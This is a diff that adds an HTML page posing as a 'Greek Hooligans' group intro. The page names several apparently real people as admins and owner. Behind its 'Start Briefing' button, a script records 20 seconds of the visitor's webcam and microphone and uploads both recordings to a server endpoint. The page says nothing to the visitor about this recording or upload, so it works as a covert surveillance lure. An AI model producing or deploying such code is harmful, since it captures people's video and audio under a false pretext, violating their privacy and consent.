@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Greek Hooligans Portal</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <div class="container">
+    <h1>Greek Hooligans Intro</h1>
+    <p>
+      Meet our admins showcasing:
+      <br>Domie Borgie
+      <br>Pierre Marguax Canete
+      <br>Gerwald Ihsan Biglang-awa
+      <br>Hans Nathan Calaranan
+      <br>Francess Pascua
+      <br>Hyex Sung Kimz
+      <br>Macey Yecam
+      <br>Skibidi Caden
+      <br>Rissalene Rose Lorenzo
+      <br><br>They are our admins who provide and serve justice to this group containing 39 members total.
+      <br>Owner is <strong>Domie Borgie</strong>, who formed this group.
+    </p>
+    
+    <button id="startBtn">Start Briefing</button>
+    <video id="preview" autoplay muted></video>
+  </div>
+
+  <script>
+    const startBtn = document.getElementById('startBtn');
+    const preview = document.getElementById('preview');
+
+    startBtn.onclick = async () => {
+      startBtn.disabled = true;
+
+      // 🎥 Get webcam + mic
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+      preview.srcObject = stream;
+      preview.style.display = 'block';
+
+      // 🎙️ Get audio-only
+      const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+
+      const videoRecorder = new MediaRecorder(stream);
+      const audioRecorder = new MediaRecorder(audioStream);
+
+      const videoChunks = [];
+      const audioChunks = [];
+
+      videoRecorder.ondataavailable = e => videoChunks.push(e.data);
+      audioRecorder.ondataavailable = e => audioChunks.push(e.data);
+
+      videoRecorder.onstop = async () => {
+        const videoBlob = new Blob(videoChunks, { type: 'video/webm' });
+        const videoForm = new FormData();
+        videoForm.append('file', videoBlob, 'webcam.webm');
+        await fetch('http://localhost:3000/webcam', { method: 'POST', body: videoForm });
+        stream.getTracks().forEach(t => t.stop());
+      };
+
+      audioRecorder.onstop = async () => {
+        const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+        const audioForm = new FormData();
+        audioForm.append('file', audioBlob, 'microphone.webm');
+        await fetch('http://localhost:3000/mic', { method: 'POST', body: audioForm });
+        audioStream.getTracks().forEach(t => t.stop());
+      };
+
+      videoRecorder.start();
+      audioRecorder.start();
+
+      setTimeout(() => {
+        videoRecorder.stop();
+        audioRecorder.stop();
+      }, 20000); // 20s
+    };
+  </script>
+</body>
+</html>
